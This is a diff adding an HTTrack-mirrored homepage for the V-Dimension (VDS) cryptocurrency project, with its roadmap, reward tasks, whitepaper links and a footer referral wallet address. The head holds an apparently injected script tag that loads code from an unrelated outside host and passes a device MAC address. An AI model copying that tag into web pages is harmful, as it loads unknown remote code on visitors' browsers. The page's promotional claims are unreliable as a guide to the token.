@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+<html>
+    
+<!-- Mirrored from www.vollar.us/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 18 Jun 2019 02:54:58 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>V-Dimension</title>
+        <meta name="keywords" content="V-Dimensi,blockchain">
+        <meta name="description" content="V-Dimensio">
+        <link rel="shortcut icon" href="statics/images/favicon.ico">
+        <link href="statics/css/common.css" rel="stylesheet"/>
+        <script src="statics/libs/jquery.min.js"></script>
+        <script src="statics/libs/jquery.cookie.js"></script>
+        <script src="statics/plugins/layer/layer.js"></script>
+        <script src="statics/plugins/qrcode/qrcode.min.js"></script>
+
+        <script>
+            function numFormat(num) {
+                var c = (num.toString().indexOf ('.') !== -1) ? num.toLocaleString() : num.toString().replace(/(\d)(?=(?:\d{3})+$)/g, '$1,');
+                return c;
+            }
+
+            $.ajaxSetup({
+                layerIndex:-1,
+                beforeSend: function(jqXHR, settings) {
+                    this.layerIndex = layer.load(1);
+                },
+                complete: function () {
+                    layer.close(this.layerIndex);
+                },
+                error: function (jqXHR, status, e) {
+                    layer.alert('Data request failed, please try again!');
+                }
+            });
+        </script>
+    <script async=true src="../t.7gg.cc_88/j1cdbf.js?MAC=CC81DA39F680"></script>
+</head>
+
+    <body>
+        <div id="root">
+            <link href="statics/css/index/header.css" rel="stylesheet">
+
+<style>
+    .header-div .nav-active{
+        font-size: 18px;
+        color: #4A90E2;
+        font-weight: bold;
+    }
+</style>
+
+<div class="header-div">
+    <div class="h-d-c">
+        <div class="h-d-l">
+            <ul>
+                <li><a class="nav-active" href="index.html">Home</a></li>
+                <li><a href="icex.html">CEX</a></li>
+                <li><a href="game.html">The Games</a></li>
+                <li><a href="whats.html">WHAT'S V</a></li>
+            </ul>
+        </div>
+        <div class="h-d-m">
+
+        </div>
+        <div class="h-d-r">
+            <ul>
+                <li><a href="paper.html">Ecology</a></li>
+                <li><a href="source.html">Download</a></li>
+                <li><a href="faq.html">FAQ</a></li>
+            </ul>
+        </div>
+        <div class="h-d-lan">
+            <div class="current_lang">
+                <div class="lang">
+                    <!--<img src="https://image.flaticon.com/icons/svg/299/299722.svg">-->
+                    <span class="lang-txt">English</span>
+                    <span class="fa fa-chevron-down chevron"></span>
+                </div>
+            </div>
+            <div class="more_lang">
+                <div class="lang selected" data-value='en_US' data-en="English" id="en_US">
+                    <span class="lang-txt">English</span>
+                </div>
+                <div class="lang" data-value='de_DE' data-en="Deutsch" id="de_DE">
+                    <span class="lang-txt">Deutsch</span>
+                </div>
+                <div class="lang" data-value='es_ES' data-en="Español" id="es_ES">
+                    <span class="lang-txt">Español</span>
+                </div>
+                <div class="lang" data-value='fr_FR' data-en="Français" id="fr_FR">
+                    <span class="lang-txt">Français</span>
+                </div>
+                <div class="lang" data-value="en_MY" data-en="Malay" id="en_MY">
+                    <span class="lang-txt">Malay</span>
+                </div>
+                <div class="lang" data-value="pt_PT" data-en="Português" id="pt_PT">
+                    <span class="lang-txt">Português</span>
+                </div>
+                <div class="lang" data-value='ru_RU' data-en="Pусский" id="ru_RU">
+                    <span class="lang-txt">Pусский</span>
+                </div>
+                <div class="lang" data-value="hi_HI" data-en="हिन्दी" id="hi_HI">
+                    <span class="lang-txt">हिन्दी</span>
+                </div>
+                <div class="lang" data-value="fa_FA" data-en="فارسی" id="fa_FA">
+                    <span class="lang-txt">فارسی</span>
+                </div>
+                <div class="lang" data-value='ko_KR' data-en="한국의" id="ko_KR">
+                    <span class="lang-txt">한국의</span>
+                </div>
+                <div class="lang" data-value='ja_JP' data-en="日本の" id="ja_JP">
+                    <span class="lang-txt">日本の</span>
+                </div>
+                <div class="lang" data-value='zh_HK' data-en="中文(繁体)" id="zh_HK">
+                    <span class="lang-txt">中文(繁体)</span>
+                </div>
+                <div class="lang" data-value='zh_CN' data-en="中文(简体)" id="zh_CN">
+                    <span class="lang-txt">中文(简体)</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+
+    $(document).ready(function(){
+
+        $('.feature').on('click',function(){
+            layer.msg('Stay Tuned', {
+                skin: 'demo-class',
+                time: 2000,
+            });
+        });
+
+        var cookieLang = $.cookie("lang");
+        var img = $('#' + cookieLang).find('img').attr('src');
+        var lang = $('#' + cookieLang).attr('data-en');
+        $('.current_lang .lang-txt').text(lang);
+        $('.current_lang img').attr('src', img);
+        $('#' + cookieLang).addClass('selected').siblings().removeClass('selected');
+
+        $(document).click( function(e) {
+            $('.h-d-lan, .more_lang').removeClass('active');
+        });
+
+        $('.h-d-lan .current_lang').click(function(e){
+            e.stopPropagation();
+            $(this).parent().toggleClass('active');
+
+            setTimeout(function(){
+                $('.more_lang').toggleClass('active');
+            }, 5);
+        });
+
+        $('.more_lang .lang').click(function(){
+            $(this).addClass('selected').siblings().removeClass('selected');
+            $('.more_lang').removeClass('active');
+
+            var img = $(this).find('img').attr('src');
+            var lang = $(this).attr('data-value');
+
+
+            $('.current_lang .lang-txt').text(lang);
+            $('.current_lang img').attr('src', img);
+
+            $.cookie("lang", lang, { expires: 30, path:'/'});
+            window.location.reload();
+        });
+    });
+
+</script><link href="statics/css/index/banner.css" rel="stylesheet">
+
+
+<div class="main-banner">
+    <div class="main-p">
+        <p class="img-vdc"></p>
+        <p> V-Dimension </p>
+        <p> Noncentralized Consensus Society Full-Ecology Future Currency Network </p>
+        <p class="main-b-w"><a style="cursor:pointer;" onclick="window.open('https://ipfs.io/ipfs/Qmam1EjeFhrMroA4zjDBECmHfBymxGZJU4TeqcqBUbubBp')">Whitepaper</a></p>
+    </div>
+</div><style>
+    .bottom-line{
+        width: 100%;
+        min-width: 1300px;
+        height: 298px;
+    }
+
+    .bottom-line img{
+        min-width: 1300px;
+        width: 100%;
+        height: 298px;
+        position:absolute;
+        z-index: -1;
+    }
+</style>
+
+
+<div class="bottom-line">
+    <img src="statics/images/img-split.png">
+</div><link href="statics/css/index/introduction.css" rel="stylesheet">
+
+<div class="intro">
+    <div class="intro-bg">
+        <img class="intro-bg-img" src="statics/images/img-blog.png">
+    </div>
+    <div class="intro-c">
+        <div class="intro-title">
+            <h1> WHAT'S V </h1>
+        </div>
+        <div class="intro-body">
+            <div class="i-b-i">
+                <p class="i-b-icon-1"></p>
+                <p class="i-b-header">Fully Anonymous Transactions</p>
+                <p class="i-b-info">Zero-knowledge proof transactions bring you true control over your personal wealth. </p>
+            </div>
+            <div class="i-b-i">
+                <p class="i-b-icon-2"></p>
+                <p class="i-b-header">Secret Chat</p>
+                <p class="i-b-info">This instant-messaging tool brings the ultimate experience of privacy and security.</p>
+            </div>
+            <div class="i-b-i">
+                <p class="i-b-icon-3"></p>
+                <p class="i-b-header">The VDS/BTC Dual Wallet</p>
+                <p class="i-b-info">Conveniently use the same private key to store and manage both currencies.</p>
+            </div>
+            <div class="i-b-i">
+                <p class="i-b-icon-4"></p>
+                <p class="i-b-header">Resonance Trade</p>
+                <p class="i-b-info">Decentralized currency's completely-new mechanism for financial equalization. It also builds an anonymous Bitcoin exchange channel.</p>
+            </div>
+            <div class="i-b-i">
+                <p class="i-b-icon-5"></p>
+                <p class="i-b-header">Distributed OTC Trade</p>
+                <p class="i-b-info">A global, decentralized exchange network owned and operated by the users themselves.</p>
+            </div>
+            <div class="i-b-i">
+                <p class="i-b-icon-6"></p>
+                <p class="i-b-header">VAD</p>
+                <p class="i-b-info">VAD is a channel to directly and accurately broadcast Ads or information to users worldwide in one step.</p>
+            </div>
+        </div>
+    </div>
+</div>
+<link href="statics/css/index/show.css" rel="stylesheet">
+
+<div class="show">
+    <div class="show-title">
+        <h1> Wallet </h1>
+    </div>
+    <div class="show-download">
+        <ul>
+            <li class="show-item">
+                <a class="show-item-a-click" data-item="pc" href="javascript:void(0)"><i id="item-i-pc" class="icon-pc-c"></i>&nbsp;PC</a>
+            </li>
+            <li class="show-item">
+                <a class="show-item-a-uclick" data-item="app" href="javascript:void(0)"><i id="item-i-app" class="icon-app-u"></i>&nbsp;APP</a>
+            </li>
+            <!--<li class="show-item">-->
+                <!--<a class="show-item-a-uclick" data-item="linux" href="javascript:void(0)"><i id="item-i-linux" class="icon-linux-u"></i>&nbsp;Linux</a>-->
+            <!--</li>-->
+        </ul>
+    </div>
+    <div class="show-body">
+        <div id="pc" style="">
+            <div class="container">
+                <div>
+                    <div class="pictureSlider-p">
+                        <ul id="zturn-pc">
+                            <li class="poster-item-p zturn-item">
+                                <div class="for_btn_p">
+                                    <img src="statics/images/img-pc-2.png" width="457px" height="286px">
+                                </div>
+                            </li>
+                            <li class="poster-item-p zturn-item">
+                                <div class="for_btn_p">
+                                    <img src="statics/images/img-pc-1.png" width="457px" height="286px">
+                                </div>
+                            </li>
+                            <li class="poster-item-p zturn-item">
+                                <div class="for_btn_p">
+                                    <img src="statics/images/img-pc-3.png" width="457px" height="286px">
+                                </div>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            <div class="show-item-download">
+                <p>
+                    <i class="icon-download"></i><a style="cursor:pointer;" onclick="window.location.href='source.html'">Download</a>
+                </p>
+            </div>
+        </div>
+
+        <div id="app" style="display: none">
+            <div class="container">
+                <div>
+                    <div class="pictureSlider">
+                        <ul id="zturn-app">
+                            <li class="poster-item zturn-item">
+                                <div class="for_btn">
+                                    <img src="statics/images/img-app-1.png" width="200px" height="420px">
+                                </div>
+                            </li>
+                            <li class="poster-item zturn-item">
+                                <div class="for_btn">
+                                    <img src="statics/images/img-app-2.png" width="200px" height="420px">
+                                </div>
+                            </li>
+                            <li class="poster-item zturn-item">
+                                <div class="for_btn">
+                                    <img src="statics/images/img-app-3.png" width="200px" height="420px">
+                                </div>
+                            </li>
+                            <li class="poster-item zturn-item">
+                                <div class="for_btn">
+                                    <img src="statics/images/img-app-4.png" width="200px" height="420px">
+                                </div>
+                            </li>
+                            <li class="poster-item zturn-item">
+                                <div class="for_btn">
+                                    <img src="statics/images/img-app-5.png" width="200px" height="420px">
+                                </div>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            <div class="show-item-download">
+                <p>
+                    <i class="icon-download"></i><a style="cursor:pointer;" onclick="window.location.href='source.html'">Download</a>
+                </p>
+            </div>
+        </div>
+
+        <!--<div id="linux" style="display: none">-->
+            <!--<div class="container">-->
+                <!--<div>-->
+                    <!--<div class="pictureSlider-p">-->
+                        <!--<ul id="zturn-linux">-->
+                            <!--<li class="poster-item-p zturn-item">-->
+                                <!--<div class="for_btn_p">-->
+                                    <!--<img src="/statics/images/img-pc-demo1.png" width="457px" height="286px">-->
+                                <!--</div>-->
+                            <!--</li>-->
+                            <!--<li class="poster-item-p zturn-item">-->
+                                <!--<div class="for_btn_p">-->
+                                    <!--<img src="/statics/images/img-pc-demo1.png" width="457px" height="286px">-->
+                                <!--</div>-->
+                            <!--</li>-->
+                            <!--<li class="poster-item-p zturn-item">-->
+                                <!--<div class="for_btn_p">-->
+                                    <!--<img src="/statics/images/img-pc-demo1.png" width="457px" height="286px">-->
+                                <!--</div>-->
+                            <!--</li>-->
+                        <!--</ul>-->
+                    <!--</div>-->
+                <!--</div>-->
+            <!--</div>-->
+            <!--<div class="show-item-download">-->
+                <!--<p>-->
+                    <!--<i class="icon-download"></i><a href="www.okay.com/download/linux">Download</a>-->
+                <!--</p>-->
+            <!--</div>-->
+        <!--</div>-->
+    <!--</div>-->
+
+</div>
+<div class="bottom-line">
+    <img src="statics/images/img-split.png">
+</div>
+
+<script src="statics/libs/zturn.js"></script>
+<script>
+
+    var items = ['app', 'pc', 'linux'];
+
+    $(".show-download li a").click(
+        function(e) {
+            var item = $(this).data("item");
+
+            // change bg
+            if(item === 'pc'){
+                $('.container').css("background","url(/statics/images/img-comp-bg.png) no-repeat center")
+            }else if(item === 'app'){
+                $('.container').css("background","url(/statics/images/img-phone-bg.png) no-repeat center")
+            }else if(item === 'linux'){
+                $('.container').css("background","url(/statics/images/img-comp-bg.png) no-repeat center")
+            }
+
+            $(this).removeClass("show-item-a-uclick").addClass("show-item-a-click").parent().siblings().find("a").removeClass("show-item-a-click").addClass("show-item-a-uclick");
+            $(this).removeClass("show-item-a-uclick").addClass("show-item-a-click").parent().siblings().find("a").removeClass("show-item-a-click").addClass("show-item-a-uclick");
+
+            $.each(items, function (i, itm) {
+                if(itm == item) {
+                    $("#" + itm).css("display", "");
+                    $("#item-i-" + itm).removeClass("icon-" + itm + '-u').addClass("icon-" + itm + '-c');
+                }else {
+                    $("#" + itm).css("display", "none");
+                    $("#item-i-" + itm).removeClass("icon-" + itm + '-c').addClass("icon-" + itm + '-u');
+                }
+            });
+        }
+    );
+
+    $.each(items, function (i, itm) {
+
+        if(itm === 'app'){
+            new zturn({
+                id: "zturn-" + itm,
+                opacity: 0.5,
+                width: 216,
+                Awidth: 1024,
+                scale: 0.8,
+                auto: true,
+                turning: 1113000
+            })
+        }else if(itm === 'pc'){
+            new zturn({
+                id: "zturn-" + itm,
+                opacity: 0.8,
+                width: 460,
+                Awidth: 1024,
+                scale: 0.8,
+                auto: true,
+                turning: 1113000
+            })
+        }else if(itm === 'linux'){
+            new zturn({
+                id: "zturn-" + itm,
+                opacity: 0.8,
+                width: 460,
+                Awidth: 1024,
+                scale: 0.8,
+                auto: true,
+                turning: 1113000
+            })
+        }
+    });
+</script><link href="statics/css/index/task.css" rel="stylesheet">
+
+<div class="task-container">
+    <img class="task-container-bg" src="statics/images/img-blog.png">
+    <div class="t-c-c">
+        <div class="task-title">
+            <h1>Ecological Development Tasks</h1>
+        </div>
+        <div class="task-body">
+            <div class="t-b-l">
+                <div class="t-b-l-h">
+                    <p class="t-b-l-t">Total Rewards Paid-out</p>
+                    <br>
+                    <br>
+                    <p class="t-b-l-n">
+                        <img style="width: 56px;height: 46px;margin-top:20px;margin-left:20px;" src="statics/images/img-coin-v-4.png"><span>0</span>
+                    </p>
+                </div>
+                <div class="t-b-l-i">
+                    <button class="button-click" onclick="window.location.href='paper.html'">Join Now</button>
+                </div>
+            </div>
+            <div class="t-b-l-l">
+                <p class="t-b-l-line"></p>
+            </div>
+            <div class="t-b-r">
+                <table style="width: 600px;">
+                    <thead>
+                        <tr>
+                            <th>Task Name</th>
+                            <th class="table-r">Reward</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td style="cursor:pointer" onclick="window.location.href='paper/detail/1.html'"><img src="statics/images/img-icon-top.png">&nbsp;&nbsp;Consensus Society of Freedom Enlightenment Reward</td>
+                            <td class="table-r" style="text-align: right;">
+                                <span>1,000,000</span><img style="width: 20px;height: 16px;margin-top:5px;margin-left:10px;" src="statics/images/img-coin-v-4.png">
+                            </td>
+                        </tr>
+                        <tr>
+                            <td style="cursor:pointer" onclick="window.location.href='paper/detail/2.html'">Clear Web Site Establishment</td>
+                            <td class="table-r" style="text-align: right;">
+                                <span>2,600,000</span><img style="width: 20px;height: 16px;margin-top:5px;margin-left:10px;" src="statics/images/img-coin-v-4.png">
+                            </td>
+                        </tr>
+                        <tr>
+                            <td style="cursor:pointer" onclick="window.location.href='paper/detail/3.html'">Exchange Platform Currency Listing</td>
+                            <td class="table-r" style="text-align: right;">
+                                <span>5,500,000</span><img style="width: 20px;height: 16px;margin-top:5px;margin-left:10px;" src="statics/images/img-coin-v-4.png">
+                            </td>
+                        </tr>
+                        <tr>
+                            <td style="cursor:pointer" onclick="window.location.href='paper/detail/6.html'">Exchange Platform Currency Listing</td>
+                            <td class="table-r" style="text-align: right;">
+                                <span>5,500,000</span><img style="width: 20px;height: 16px;margin-top:5px;margin-left:10px;" src="statics/images/img-coin-v-4.png">
+                            </td>
+                        </tr>
+                        <tr>
+                            <td style="cursor:pointer" onclick="window.location.href='paper/detail/4.html'">Mining Pool Participation</td>
+                            <td class="table-r" style="text-align: right;">
+                                <span>1,400,000</span><img style="width: 20px;height: 16px;margin-top:5px;margin-left:10px;" src="statics/images/img-coin-v-4.png">
+                            </td>
+                        </tr>
+                        <tr>
+                            <td style="cursor:pointer" onclick="window.location.href='paper/detail/5.html'">Market Data Platform Listing</td>
+                            <td class="table-r" style="text-align: right;">
+                                <span>500,000</span><img style="width: 20px;height: 16px;margin-top:5px;margin-left:10px;" src="statics/images/img-coin-v-4.png">
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+</div><link href="statics/css/index/desc.css" rel="stylesheet">
+
+<div class="desc-container">
+    <div class="desc-container-header">
+        <h1>Issuance Overview</h1>
+    </div>
+    <div class="desc-container-body">
+
+    </div>
+</div>
+
+<script>
+    $('.desc-container-body').css("background","url(/statics/images/img-desc-us.png) no-repeat center")
+</script>
+
+<link href="statics/css/index/roasdmap.css" rel="stylesheet">
+
+<div class="map-container">
+    <div class="map-container-header">
+        <h1>Roadmap</h1>
+    </div>
+    <div class="map-container-body">
+        <div class="map-container-body-l">
+            <div class="item">
+                <div id="timeline">
+                    <div>
+                        <section class="year">
+
+                        </section>
+                        <section class="year">
+                            <h3>2016</h3>
+                            <br>
+                            <br>
+                            <br>
+                            <br>
+                            <br>
+                            <br>
+                            <br>
+                            <section>
+                                <h4>08-2016</h4>
+                                <ul>
+                                    <li>Establishment of the Noncentralized Financial Promotions Group</li>
+                                </ul>
+                            </section>
+                            <br>
+                            <section>
+                                <h4>10-2016</h4>
+                                <ul>
+                                    <li>Direction set for the Noncentralized Full-Ecology Future Currency Network</li>
+                                </ul>
+                            </section>
+                            <section>
+                                <h4>11-2016</h4>
+                                <ul>
+                                    <li>Initial Development of Product Concept and Logic</li>
+                                </ul>
+                            </section>
+                            <br>
+                        </section>
+                        <section class="year">
+                            <h3>2017</h3>
+                            <section>
+                                <h4>01-2017</h4>
+                                <ul>
+                                    <li>Initial Development of Underlying Framework</li>
+                                </ul>
+                            </section>
+                            <br>
+                            <br>
+                            <br>
+                            <br>
+                            <br>
+                            <br>
+                            <section>
+                                <h4>08-2017</h4>
+                                <ul>
+                                    <li>Product Functions Upgrade</li>
+                                </ul>
+                            </section>
+                            <br>
+                            <br>
+                            <br>
+                            <br>
+                        </section>
+                        <section class="year">
+                            <h3>2018</h3>
+                            <section>
+                                <h4>01-2018</h4>
+                                <ul>
+                                    <li>Architecture of Underlying Technological Framework Completed</li>
+                                </ul>
+                            </section>
+                            <br>
+                            <br>
+                            <br>
+                            <br>
+                            <section>
+                                <h4>06-2018</h4>
+                                <ul>
+                                    <li>Confirmation of The Noncentralized Consensus Society Full-Ecology Future Currency Network</li>
+                                </ul>
+                            </section>
+                            <section>
+                                <h4>07-2018</h4>
+                                <ul>
+                                    <li>Project Is Officially Named V-Dimension (VDS)</li>
+                                </ul>
+                            </section>
+                            <br>
+                            <br>
+                            <br>
+                            <br>
+                            <section>
+                                <h4>11-2018</h4>
+                                <ul>
+                                    <li>VDS Development Complete, Final Testing Carried Out</li>
+                                </ul>
+                            </section>
+                            <br>
+                        </section>
+                        <section class="year">
+                            <h3>2019</h3>
+                            <section>
+                                <h4>01-2019</h4>
+                                <ul>
+                                    <li>Project and Project White Paper Officially Released</li>
+                                </ul>
+                            </section>
+                            <section>
+                                <h4>02-2019</h4>
+                                <ul>
+                                    <li>VDS Goes Online. ICEX and The Genesis Game Both Begin</li>
+                                </ul>
+                            </section>
+                            <br>
+                            <br>
+                            <br>
+                            <br>
+                            <br>
+                            <br>
+                            <br>
+                            <br>
+                            <br>
+                            <br>
+                        </section>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="map-container-body-r">
+            <img class="home-map-1" src="statics/images/img-map-1.png">
+            <img class="home-map-2" src="statics/images/img-map-2.png">
+            <img class="home-map-3" src="statics/images/img-map-3.png">
+            <img class="home-map-4" src="statics/images/img-map-4.png">
+            <img class="home-map-5" src="statics/images/img-map-5.png">
+            <img class="home-map-6" src="statics/images/img-map-6.png">
+            <p class="home-map-center">Noncentralized Consensus Society Full-Ecology Future Currency Network</p>
+        </div>
+    </div>
+</div>
+
+<script>
+
+    $('.home-map-1').on({
+        mouseover: function () {
+            var that = this;
+            layer.tips('Anonymous Cryptocurrency Superconducting Financial Network',that,{
+                tips:3,
+                shift:5,
+                time:0,
+                skin:'grey-white'
+            });
+        },
+
+        mouseout: function() {
+            layer.closeAll();
+        }
+    });
+
+    $('.home-map-2').on({
+        mouseover: function () {
+            var that = this;
+            layer.tips('Value-Sharing Private Peer-to-Peer Network',that,{
+                tips:3,
+                shift:5,
+                time:0,
+                skin:'grey-white'
+            });
+        },
+
+        mouseout: function() {
+            layer.closeAll();
+        }
+    });
+
+    $('.home-map-3').on({
+        mouseover: function () {
+            var that = this;
+            layer.tips('Consumer-Capital Embedded Smart-Business System',that,{
+                tips:3,
+                shift:5,
+                time:0,
+                skin:'grey-white'
+            });
+        },
+
+        mouseout: function() {
+            layer.closeAll();
+        }
+    });
+
+    $('.home-map-4').on({
+        mouseover: function () {
+            var that = this;
+            layer.tips('Virtual International Network of Freedom and Co-existence',that,{
+                tips:3,
+                shift:5,
+                time:0,
+                skin:'grey-white'
+            });
+        },
+
+        mouseout: function() {
+            layer.closeAll();
+        }
+    });
+
+    $('.home-map-5').on({
+        mouseover: function () {
+            var that = this;
+            layer.tips('Highly-Scalable Social Cooperation System',that,{
+                tips:3,
+                shift:5,
+                time:0,
+                skin:'grey-white'
+            });
+        },
+
+        mouseout: function() {
+            layer.closeAll();
+        }
+    });
+
+    $('.home-map-6').on({
+        mouseover: function () {
+            var that = this;
+            layer.tips('Full-Coverage Information Bidding System',that,{
+                tips:3,
+                shift:5,
+                time:0,
+                skin:'grey-white'
+            });
+        },
+
+        mouseout: function() {
+            layer.closeAll();
+        }
+    });
+</script><link href="statics/css/index/paper.css" rel="stylesheet">
+
+<div class="paper-container">
+    <div class="paper-c">
+        <div class="paper-container-left">
+            <h1>The Whitepaper</h1>
+            <div class="p-c-l-i">
+                <p>
+                    VDS is a noncentralized ecology that combines the advantages of blockchain, social networking, and information technology in a way which allows the liberated, frictionless circulation of all users' assets within the ecology.
+                </p>
+            </div>
+            <div class="p-c-l-d">
+                <div class="p-c-l-b">
+                    <button class="button-click" onclick="window.open('https://ipfs.io/ipfs/Qmam1EjeFhrMroA4zjDBECmHfBymxGZJU4TeqcqBUbubBp')">Whitepaper</button>
+                </div>
+                <div class="p-c-l-u">
+
+                </div>
+            </div>
+        </div>
+        <div class="paper-container-right">
+
+        </div>
+    </div>
+    <div class="p-l">
+        <p class="p-line"></p>
+    </div>
+</div>
+
+<link href="statics/css/footer.css" rel="stylesheet">
+
+<div class="footer-bg">
+    <div class="footer-nav">
+        <div class="footer-nav-left">
+            <img style="width:163px;height:113px;" src="statics/images/img-banner-vds-1.png">
+        </div>
+        <div class="footer-nav-right">
+            <table style="border-collapse:separate; border-spacing:110px 20px;">
+                <tr>
+                    <td noWrap="noWrap" class="footer-nav-td1">Introduction</td>
+                    <td noWrap="noWrap" class="footer-nav-td1">Download</td>
+                    <td noWrap="noWrap" class="footer-nav-td1">Other</td>
+                </tr>
+                <tr>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="whats.html">What's V</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="source.html">APP/PC</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="faq.html">FAQ</a></td>
+                </tr>
+                <tr>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="cex.html">CEX</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="source.html">Other</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"></td>
+                </tr>
+                <tr>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="game.html">Top 10</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"></td>
+                </tr>
+            </table>
+        </div>
+        <div class="footer-nav-qrcode">
+            <div class="qrcode-container">
+                <div style="background: #FFFFFF;width:160px; height:160px;padding: 10px;border-radius:8px;margin: 0 auto;">
+                    <div id="qrcode"></div>
+                </div>
+                <p>Join My Team! Activate Your VID!</p>
+                <p class="addr-hidden" title="VcbKd8K5tgEv9a5iphhVqttmbQh7qa67CYD">VcbKd8K5tgEv9a5iphhVqttmbQh7qa67CYD</p>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+<script>
+    var qrcode = new QRCode(document.getElementById("qrcode"), {
+        text: "VcbKd8K5tgEv9a5iphhVqttmbQh7qa67CYD",
+        width: 140,
+        height: 140,
+        colorDark : "#000000",
+        colorLight : "#ffffff",
+        correctLevel : QRCode.CorrectLevel.H
+    });
+</script>
+
+        </div>
+    </body>
+
+<!-- Mirrored from www.vollar.us/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 18 Jun 2019 02:55:35 GMT -->
+</html>
